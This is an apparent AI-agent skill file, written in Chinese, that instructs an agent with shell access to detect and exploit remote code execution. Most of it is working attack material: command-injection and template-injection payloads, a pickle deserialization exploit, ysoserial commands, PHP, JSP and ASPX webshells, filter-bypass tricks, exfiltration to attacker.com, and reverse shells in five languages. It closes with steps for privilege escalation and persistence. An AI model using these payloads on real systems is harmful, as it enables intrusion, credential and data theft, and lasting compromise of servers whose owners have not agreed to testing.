---
name: rce
description: 远程代码执行漏洞检测与利用。当目标存在命令执行、代码执行、反序列化、模板注入、文件上传时使用。
allowed-tools: Bash, Read, Write
---

# 远程代码执行 (RCE)

在目标服务器上执行任意代码或命令，获取系统控制权。

## 常见指示器

- 命令执行参数（cmd=, exec=, command=, run=）
- 代码执行功能（eval, exec, system）
- 文件上传功能
- 反序列化输入（序列化数据、pickle、Java 对象）
- 模板渲染（Jinja2, Twig, Freemarker）
- 动态包含（include, require）

## 检测方法

### 1. 命令注入测试

```bash
# 基础测试
curl "http://target.com/ping?ip=127.0.0.1;id"
curl "http://target.com/ping?ip=127.0.0.1|id"
curl "http://target.com/ping?ip=127.0.0.1`id`"
curl "http://target.com/ping?ip=127.0.0.1$(id)"

# 时间盲注
curl "http://target.com/ping?ip=127.0.0.1;sleep 5"
curl "http://target.com/ping?ip=127.0.0.1|sleep 5"
```

### 2. 模板注入测试

```bash
# 基础测试
curl "http://target.com/page?name={{7*7}}"
curl "http://target.com/page?name=${7*7}"
curl "http://target.com/page?name=<%= 7*7 %>"
```

## 攻击向量

### 命令注入

```bash
# 命令分隔符
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
\nid

# 常用命令
id
whoami
uname -a
cat /etc/passwd
ls -la
pwd
env

# 反弹 Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 代码注入

```php
// PHP
system($_GET['cmd']);
exec($_GET['cmd']);
passthru($_GET['cmd']);
shell_exec($_GET['cmd']);
eval($_GET['code']);
assert($_GET['code']);
preg_replace('/.*/e', $_GET['code'], '');
```

```python
# Python
eval(user_input)
exec(user_input)
os.system(user_input)
subprocess.call(user_input, shell=True)
__import__('os').system(user_input)
```

### 模板注入 (SSTI)

```python
# Jinja2 (Python)
{{7*7}}
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# 常用 payload
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

```java
// Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

```php
// Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### 反序列化

```python
# Python pickle
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
```

```java
// Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

```php
// PHP
O:8:"stdClass":1:{s:4:"test";s:2:"id";}
// 利用 __wakeup, __destruct 等魔术方法
```

### 文件上传 RCE

```php
// PHP webshell
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
<?=`$_GET[0]`?>
<?php passthru($_REQUEST['cmd']); ?>

// 图片马
GIF89a<?php system($_GET['cmd']); ?>

// .htaccess
AddType application/x-httpd-php .jpg
```

```jsp
// JSP webshell
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

```aspx
// ASPX webshell
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>
```

## PHP 回调函数 RCE

### call_user_func / call_user_func_array

**漏洞原理**: 将用户可控的函数名传入 `call_user_func()` 执行

**危险模式**:
```php
// 模式1: 直接函数名传递
call_user_func($_GET['f']);

// 模式2: 带参数传递
call_user_func($_GET['func'], $_GET['arg']);

// 模式3: call_user_func_array
call_user_func_array($_GET['func'], $_GET['args']);
```

**测试 Payload 矩阵**:

| 测试目标 | Payload | 说明 |
|---------|---------|------|
| 基础验证 | `?f=phpinfo` | 显示PHP配置 |
| 命令执行 | `?f=system&arg=whoami` | 执行系统命令 |
| 文件读取 | `?f=file_get_contents&fn=/etc/passwd` | 读取敏感文件 |
| 自定义函数 | `?f=ctfshow_1024` | 直接调用泄露的自定义函数 |

**关键发现**: `call_user_func($_GET['f'])` 只接受一个参数 `f`，额外参数不会被使用！

**利用要点**:
1. 先调用 `phpinfo()` 查看环境信息
2. 搜索自定义函数（如 `ctfshow_xxx`）可能直接返回 flag
3. 搜索 `disable_functions`、`open_basedir`、`FLAG` 环境变量

---

### create_function

**漏洞原理**: 创建匿名函数并执行，第二个参数为代码字符串

**危险模式**:
```php
// 动态创建函数执行
$func = create_function('$code', $_GET['code']);
```

**利用 Payload**:
```php
create_function('', 'system("whoami");');
```

---

### uasort / uksort

**漏洞原理**: 使用用户提供的回调函数处理数组

**危险模式**:
```php
$arr = $_GET['arr'];
uasort($arr, $_GET['callback']);
```

---

### array_map

**漏洞原理**: 对数组每个元素应用回调函数

**危险模式**:
```php
$func = $_GET['func'];
$arr = $_GET['arr'];
array_map($func, $arr);
```

---

## phpinfo 信息泄露利用

**利用场景**:
1. 发现网站存在 `phpinfo()` 函数输出页面
2. LFI+RCE 组合利用时先调用 `phpinfo()` 获取环境信息

**关键信息收集项**:

| 信息类型 | 泄露内容 | 利用价值 |
|---------|---------|---------|
| disable_functions | 被禁用的函数 | 确定绕过方案 |
| open_basedir | 目录限制 | 确定可访问路径 |
| extension_dir | PHP扩展路径 | 确定.so注入位置 |
| upload_tmp_dir | 上传临时目录 | 确定写文件位置 |
| session.save_path | Session存储 | 确定Session文件位置 |
| allow_url_include | 是否允许远程文件包含 | RFI利用条件 |
| FLAG / flag | 环境变量中的flag | 直接获取flag |
| ctfshow_xxx | 自定义函数 | 可能直接返回flag |

**利用要点**:
- phpinfo 中的 `disable_functions` 为空 ≠ 安全，可能是陷阱
- 搜索 `_SERVER['FLAG']` 或 `$FLAG` 环境变量
- 搜索自定义函数段（如 `ctfshow_`），直接调用可能获取 flag

---

## 绕过技术

### 空格绕过

```bash
# 使用 $IFS
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 使用 Tab
cat	/etc/passwd

# 使用大括号
{cat,/etc/passwd}

# 使用 < >
cat</etc/passwd
```

### 关键字绕过

```bash
# 拼接
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量
a=c;b=at;$a$b /etc/passwd

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 十六进制
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# 通配符
/???/??t /???/p??s??
cat /e?c/p?sswd
cat /e*c/p*d
```

### 无回显 RCE

```bash
# DNS 外带
curl http://`whoami`.attacker.com
ping -c 1 `whoami`.attacker.com

# HTTP 外带
curl http://attacker.com/?data=`cat /etc/passwd | base64`
wget http://attacker.com/?data=$(id)

# 时间盲注
if [ $(whoami | cut -c 1) = "r" ]; then sleep 5; fi

# 写文件
id > /var/www/html/output.txt
```

## 常用工具

### commix

```bash
# 自动检测
commix -u "http://target.com/page?cmd=test"

# POST 请求
commix -u "http://target.com/page" --data="cmd=test"

# 获取 shell
commix -u "http://target.com/page?cmd=test" --os-shell
```

### tplmap

```bash
# 模板注入检测
python tplmap.py -u "http://target.com/page?name=test"

# 获取 shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# 指定引擎
python tplmap.py -u "http://target.com/page?name=test" -e jinja2
```

### ysoserial

```bash
# 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'

# 常用 gadget
CommonsCollections1-7
Jdk7u21
Spring1-2
Hibernate1-2
```

## 反弹 Shell

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Netcat

```bash
nc -e /bin/bash 10.0.0.1 4444
nc -c /bin/bash 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 最佳实践

1. 先测试命令注入：使用 ; | ` $() 等分隔符
2. 检查是否有回显，无回显使用时间盲注或外带
3. 测试模板注入：{{7*7}} ${7*7}
4. 检查文件上传功能，尝试上传 webshell
5. 分析反序列化点，使用 ysoserial 生成 payload
6. 使用绕过技术规避过滤
7. 成功 RCE 后尝试反弹 shell
8. 提权并持久化
